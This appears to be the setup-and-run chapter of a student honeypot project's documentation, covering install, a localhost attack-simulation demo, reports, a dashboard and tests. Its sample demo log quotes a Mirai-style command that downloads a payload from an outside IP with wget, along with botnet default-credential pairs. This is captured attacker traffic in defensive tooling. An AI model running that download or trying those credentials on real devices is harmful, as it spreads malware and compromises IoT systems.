# 06 — Setup & Run

---

## 6.1 Requirements

| | |
|---|---|
| **Python** | 3.10 or newer |
| **Required** | nothing — the honeypot uses only the standard library |
| **Optional** | `Flask` (dashboard), `pytest` |
| **Root** | never needed; high ports by default |

The honeypot itself has **zero dependencies** — asyncio, sqlite3 and the rest are all standard library. Flask is only for the dashboard.

---

## Step 1 — Get the code

```bash
git clone https://github.com/<your-username>/honeypot-network.git
cd honeypot-network
python -m venv .venv && source .venv/bin/activate
pip install -r requirements.txt
```

## Step 2 — The demo

The fastest way to see everything:

```bash
python -m src.cli demo
```

This stands up the honeypot on localhost, launches 40 realistic attacks against it, and prints a report — in about five seconds, entirely self-contained.

```
  Honeypot up on 127.0.0.1 (7 services). Simulating 40 attacks...

  --------------------------------------------------------------------------
!! 21:36:19  127.0.0.1  ssh     SSH-2.0-libssh_0.9.6   <- libssh (commonly a credential-stuffing botnet)
 . 21:36:19  127.0.0.1  telnet  login 'root' / 'xc3511'
!! 21:36:20  127.0.0.1  telnet  $ busybox MIRAI        <- BusyBox applet probing (Mirai fingerprint)
!! 21:36:20  127.0.0.1  telnet  $ wget http://185.99.44.12/bins/mirai.arm -O /tmp/x   <- downloading a payload
  ...

  SUMMARY
    sessions          52
    distinct sources  1
    interactions      135
    credential tries  39

  TOP CREDENTIALS
       6x  'root' / 'root'
       6x  'root' / 'vizxv'
       3x  'root' / 'xc3511'
  ...
```

Options:

```bash
python -m src.cli demo --count 100      # more attacks
python -m src.cli demo --seed 7         # different random mix
```

## Step 3 — Explore the capture

The demo leaves everything in `logs/honeypot.db`. Query it:

```bash
python -m src.cli report        # the full analysis
python -m src.cli credentials   # ranked login attempts
python -m src.cli attackers     # ranked source IPs by threat
```

```
  Top attempted logins:

      6x  ####################  'support' / 'support'
      6x  ####################  'root' / 'root'
      3x  ##########..........  'root' / 'xc3511'
```

## Step 4 — The dashboard

```bash
python -m src.app        # http://127.0.0.1:5000
```

A read-only web view: summary tiles, top credentials, what attackers tried, services probed, top sources, and a live activity feed. Refresh to update. `Ctrl+C` to stop.

## Step 5 — Run it for real

```bash
python -m src.cli run                    # localhost, high ports (safe)
```

```
  Honeypot listening on 127.0.0.1
    ssh      port 8022   (OpenSSH 8.9p1 Ubuntu-3ubuntu0.4)
    ftp      port 8021   (vsFTPd 3.0.5)
    telnet   port 8023   (BusyBox v1.35.0 login)
    http     port 8080   (Apache/2.4.52 (Ubuntu))
    smtp     port 10525  (Postfix smtpd)
    redis    port 14379  (Redis 6.0.16)
    mysql    port 11306  (MySQL 8.0.32)

  Logging to logs/honeypot.db. Ctrl+C to stop.
```

Connect to it yourself to see it work:

```bash
# in another terminal
nc localhost 8023           # telnet honeypot -- try logging in
curl localhost:8080/.env    # http honeypot -- watch it get flagged
redis-cli -p 14379 ping     # if you have redis-cli
```

Then check `python -m src.cli report`.

**Exposing it to a real network** (`--bind 0.0.0.0`) is a serious step — read [doc 05](05-deployment.md) first.

## Step 6 — Customise the services

Run a subset, or on specific ports:

```bash
python -m src.cli run --service ssh --service http
python -m src.cli run --service telnet:2323 --service http:8888
python -m src.cli run --offset 0          # use the REAL default ports (needs root)
```

## Step 7 — Tests

```bash
python tests/test_all.py
```

```
PASS  test_sql_injection_is_stored_as_data
PASS  test_control_characters_are_neutralised
...
24/24 tests passed
```

`python -m pytest -q` also works.

---

## 6.2 Troubleshooting

### `ModuleNotFoundError: No module named 'src'`

Wrong directory or command form.

```bash
pwd                       # must be .../honeypot-network
python -m src.cli demo    # correct  (-m, dots)
python src/cli.py demo    # wrong    (relative imports break)
```

### `PermissionError` / `Address already in use`

You tried a low port (below 1024) without root, or the port is taken. Use the default high ports, or pick your own:

```bash
python -m src.cli run                          # high ports, no root
python -m src.cli run --service ssh:9022
```

### The dashboard is empty

No data captured yet. Run the demo first:

```bash
python -m src.cli demo
python -m src.app
```

The dashboard reads `logs/honeypot.db`; make sure you run it from the same directory.

### `ModuleNotFoundError: No module named 'flask'`

Only the dashboard needs Flask. The honeypot, demo and reports don't.

```bash
pip install flask
```

### Nothing happens when I connect

Connections to the honeypot are silent unless they trigger an interaction. A bare TCP connect that sends nothing is recorded as a session but produces no console line until the idle timeout closes it. Send something (`nc localhost 8023` then type) to see activity.

### Windows: `python` opens the Microsoft Store

Use `py` (`py -m src.cli demo`), or disable the alias in Settings → Apps → App execution aliases.

---

## 6.3 Everything

```bash
git clone https://github.com/<your-username>/honeypot-network.git
cd honeypot-network
python -m venv .venv && source .venv/bin/activate
pip install -r requirements.txt

python -m src.cli demo
python -m src.cli report
python -m src.cli credentials
python -m src.app
python tests/test_all.py
```

---

**Previous:** [05 — Deployment](05-deployment.md) | **Next:** [07 — Viva questions](07-viva-questions.md)
